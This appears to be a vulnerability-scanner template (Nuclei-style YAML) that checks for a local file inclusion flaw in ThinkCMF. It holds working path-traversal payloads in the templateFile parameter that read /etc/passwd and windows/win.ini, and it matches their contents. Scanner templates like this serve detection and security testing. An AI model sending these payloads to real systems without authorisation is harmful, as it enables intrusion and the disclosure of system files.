id: thinkcmf-lfi-3
info:
  author: pikpikcu
  name: ThinkCMF LFI
  reference: https://www.freebuf.com/vuls/217586.html
  severity: high
  tags: thinkcmf,lfi
requests:
- matchers:
  - regex:
    - 'root:.*:0:0:'
    - bit app support
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?a=display&templateFile=../../../../../../../../../../../../../../../../etc/passwd'
  - '{{BaseURL}}/?a=display&templateFile=../../../../../../../../../../../../../../../../windows/win.ini'
